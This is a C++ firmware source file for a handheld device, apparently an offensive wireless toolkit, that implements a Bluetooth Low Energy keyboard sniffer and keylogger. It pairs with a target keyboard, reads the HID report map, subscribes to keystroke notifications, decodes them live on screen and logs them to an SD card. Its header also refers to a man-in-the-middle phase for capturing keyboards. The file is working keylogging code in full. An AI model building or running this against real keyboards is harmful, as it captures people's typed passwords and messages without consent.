/*
 * ble_hidsniff — BLE HID sniffer / keylogger  (Chimera BLE Phase 1).
 *
 * Connects to a scanned BLE keyboard as a central, reads its HID Report
 * Map (0x2A4B) from the HID service (0x1812), parses it into a keyboard
 * input layout, subscribes to the Report (0x2A4D) notifications, and
 * decodes each input report live into human-readable keystrokes on screen
 * and to an SD log.
 *
 * HONEST SCOPE — this is an ACTIVE capture, not passive interception.
 * BLE HID characteristics are encryption-required, so we connect AND
 * pair/bond as a host. It captures keyboards that are (a) in pairing mode,
 * (b) unbonded / connectable, or (c) routed through the Phase 2 MITM. You
 * cannot passively decrypt a keyboard already bonded to another host on a
 * single radio (no LTK).
 *
 * Target comes from g_ble_target (set by Scan's ENTER), same handoff as
 * ble_gatt. `=disconnect + exit.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "menu.h"
#include "ble_types.h"
#include "../hid_decode.h"
#include "sd_helper.h"
#include <NimBLEDevice.h>
#include <SD.h>
#include <string>

#define HID_SVC_UUID   ((uint16_t)0x1812)
#define HID_MAP_UUID   ((uint16_t)0x2A4B)
#define HID_REPORT_UUID ((uint16_t)0x2A4D)

#define HS_MAX_SUBS   8       /* input Report characteristics we subscribe to */
#define HS_Q          16      /* raw-report queue depth (NimBLE cb -> UI loop) */
#define HS_QBUF       20      /* max bytes per report we keep */
#define HS_LINES      8       /* on-screen decoded history rows */

/* --- raw report queue: single NimBLE producer, single UI-loop consumer --- */
struct hs_qent { uint8_t len; uint8_t buf[HS_QBUF]; };
static hs_qent          s_q[HS_Q];
static volatile int     s_q_head = 0;   /* written by notify cb */
static volatile int     s_q_tail = 0;   /* read by UI loop */
static volatile uint32_t s_dropped = 0;

static void hid_notify_cb(NimBLERemoteCharacteristic *chr, uint8_t *data,
                          size_t len, bool isNotify)
{
    (void)chr; (void)isNotify;
    int nh = (s_q_head + 1) % HS_Q;
    if (nh == s_q_tail) { s_dropped++; return; }   /* full: drop, keep radio happy */
    hs_qent &e = s_q[s_q_head];
    e.len = (uint8_t)(len < HS_QBUF ? len : HS_QBUF);
    memcpy(e.buf, data, e.len);
    s_q_head = nh;
}

/* --- decoded history ring ---------------------------------------------- */
static char s_lines[HS_LINES][40];
static int  s_line_n = 0;         /* total pushed (mod for slot) */
static char s_last_raw[40] = "";
static volatile bool s_dirty = true;

static void push_line(const char *s)
{
    snprintf(s_lines[s_line_n % HS_LINES], sizeof(s_lines[0]), "%s", s);
    s_line_n++;
    s_dirty = true;
}

/* --- state ------------------------------------------------------------- */
static NimBLEClient *s_client = nullptr;
static NimBLERemoteCharacteristic *s_subs[HS_MAX_SUBS];
static int s_sub_n = 0;
static hid_layout_t s_layout;
static File s_log;
static bool s_have_log = false;

static void draw_frame(const char *status)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_ACCENT, T_BG);
    d.setCursor(4, BODY_Y + 2); d.print("HID SNIFF");
    d.drawFastHLine(4, BODY_Y + 12, 70, T_ACCENT);
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(80, BODY_Y + 2);
    d.printf("%.20s", status ? status : "");
}

static void draw_body(void)
{
    auto &d = M5Cardputer.Display;
    /* history rows */
    int shown = s_line_n < HS_LINES ? s_line_n : HS_LINES;
    int first = s_line_n - shown;
    d.fillRect(0, BODY_Y + 16, SCR_W, BODY_H - 16, T_BG);
    for (int i = 0; i < shown; ++i) {
        int slot = (first + i) % HS_LINES;
        d.setTextColor(i == shown - 1 ? T_FG : T_DIM, T_BG);
        d.setCursor(4, BODY_Y + 18 + i * 10);
        d.printf("%.40s", s_lines[slot]);
    }
    /* raw-hex line at the bottom */
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + BODY_H - 10);
    d.printf("raw %.34s", s_last_raw);
}

/* Decode one queued report, render, and log. */
static void process_report(const uint8_t *rpt, int len)
{
    /* raw hex for the status line */
    char *p = s_last_raw;
    int room = (int)sizeof(s_last_raw);
    for (int i = 0; i < len && room > 3; ++i) {
        int w = snprintf(p, room, "%02X ", rpt[i]);
        p += w; room -= w;
    }

    char keys[64] = "";
    int n = 0;
    if (s_layout.is_keyboard) {
        /* BLE HID Report notifications carry the report body WITHOUT the
         * report-ID prefix byte. Our layout offsets include a +1 base when
         * the map declared a report ID, so shift a scratch copy to line up. */
        if (s_layout.report_id != 0) {
            uint8_t tmp[HS_QBUF + 1] = { 0 };
            int c = len < HS_QBUF ? len : HS_QBUF;
            memcpy(tmp + 1, rpt, c);
            n = hid_decode_keyboard(&s_layout, tmp, c + 1, keys, sizeof(keys));
        } else {
            n = hid_decode_keyboard(&s_layout, rpt, len, keys, sizeof(keys));
        }
    }
    if (n > 0) push_line(keys);
    s_dirty = true;

    if (s_have_log) {
        char raw[48] = "";
        char *r = raw; int rr = (int)sizeof(raw);
        for (int i = 0; i < len && rr > 3; ++i) { int w = snprintf(r, rr, "%02X", rpt[i]); r += w; rr -= w; }
        s_log.printf("%lu,%s,%s\n", (unsigned long)millis(), keys, raw);
        s_log.flush();
    }
}

static void unsubscribe_all(void)
{
    for (int i = 0; i < s_sub_n; ++i)
        if (s_subs[i]) s_subs[i]->unsubscribe();
    s_sub_n = 0;
}

void feat_ble_hidsniff(void)
{
    if (!g_ble_target_valid) {
        ui_toast("scan + select first", T_WARN, 1200);
        return;
    }
    radio_switch(RADIO_BLE);

    /* Reset state. */
    s_q_head = s_q_tail = 0;
    s_dropped = 0;
    s_line_n = 0;
    s_sub_n = 0;
    s_last_raw[0] = 0;
    memset(&s_layout, 0, sizeof(s_layout));

    /* Active capture needs to pair/bond as a host. Just-works IO cap; bond
     * + secure connections so encrypted HID reads/notifies are permitted. */
    NimBLEDevice::setSecurityAuth(true, false, true);
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);

    char tgt[40];
    if (g_ble_target.name[0])
        snprintf(tgt, sizeof(tgt), "%s", g_ble_target.name);
    else
        snprintf(tgt, sizeof(tgt), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g_ble_target.addr[0], g_ble_target.addr[1], g_ble_target.addr[2],
                 g_ble_target.addr[3], g_ble_target.addr[4], g_ble_target.addr[5]);
    ui_connecting_screen(tgt);
    ui_draw_footer("`=disconnect");
    ui_draw_status(radio_name(), "hidsniff");

    s_client = NimBLEDevice::createClient();
    if (!s_client) { ui_toast("BLE client pool full", T_BAD, 1500); return; }
    s_client->setConnectTimeout(6000);

    NimBLEAddress addr(g_ble_target.addr,
                       g_ble_target.is_public ? BLE_ADDR_PUBLIC : BLE_ADDR_RANDOM);
    if (!s_client->connect(addr)) {
        NimBLEDevice::deleteClient(s_client); s_client = nullptr;
        draw_frame("connect failed");
        ui_draw_footer("`=back");
        while (input_poll() != PK_ESC) delay(40);
        return;
    }

    /* Connected: animate through the blocking Report Map read + char
     * discovery so the stale connecting screen does not look frozen. */
    ui_spinner(SCR_W - 14, BODY_Y + 6, T_ACCENT);
    M5Cardputer.Display.fillRect(0, BODY_Y + 74, SCR_W, 10, T_BG);
    M5Cardputer.Display.setTextColor(T_DIM, T_BG);
    M5Cardputer.Display.setCursor(4, BODY_Y + 74);
    M5Cardputer.Display.print("reading HID map...");

    /* Find the HID service + Report Map. */
    NimBLERemoteService *svc = s_client->getService(NimBLEUUID(HID_SVC_UUID));
    if (!svc) {
        draw_frame("no HID service");
        ui_draw_footer("`=back");
        while (input_poll() != PK_ESC) delay(40);
        s_client->disconnect();
        NimBLEDevice::deleteClient(s_client); s_client = nullptr;
        return;
    }

    NimBLERemoteCharacteristic *rm = svc->getCharacteristic(NimBLEUUID(HID_MAP_UUID));
    if (rm && rm->canRead()) {
        std::string map = rm->readValue();
        if (!map.empty())
            hid_parse_report_map((const uint8_t *)map.data(), (int)map.size(), &s_layout);
    }

    /* Subscribe to every Report characteristic that can notify. */
    const std::vector<NimBLERemoteCharacteristic *> &chrs = svc->getCharacteristics(true);
    for (auto *c : chrs) {
        if (s_sub_n >= HS_MAX_SUBS) break;
        if (c->getUUID().equals(NimBLEUUID(HID_REPORT_UUID)) && c->canNotify()) {
            if (c->subscribe(true, hid_notify_cb)) s_subs[s_sub_n++] = c;
        }
    }

    /* Open the SD log (best effort). */
    s_have_log = false;
    if (sd_mount()) {
        s_log = sdlog_open("hidsniff", "ts,keys,raw");
        s_have_log = (bool)s_log;
    }

    const char *status = s_sub_n == 0 ? "no report notify"
                       : s_layout.is_keyboard ? "keyboard live"
                                              : "raw (not kbd)";
    draw_frame(status);
    ui_draw_footer("`=disconnect");
    s_dirty = true;

    /* Main loop: drain the queue, decode, render. */
    uint32_t last_draw = 0;
    while (true) {
        while (s_q_tail != s_q_head) {
            hs_qent &e = s_q[s_q_tail];
            process_report(e.buf, e.len);
            s_q_tail = (s_q_tail + 1) % HS_Q;
        }
        if (s_dirty && millis() - last_draw > 60) {
            s_dirty = false;
            last_draw = millis();
            draw_body();
        }
        if (!s_client->isConnected()) { draw_frame("target gone"); s_dirty = true; draw_body(); }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        delay(15);
    }

    /* Clean teardown: unsubscribe, close log, delete client (never cache). */
    unsubscribe_all();
    if (s_have_log) { s_log.close(); s_have_log = false; }
    if (s_client) {
        if (s_client->isConnected()) s_client->disconnect();
        NimBLEDevice::deleteClient(s_client);
        s_client = nullptr;
    }
}
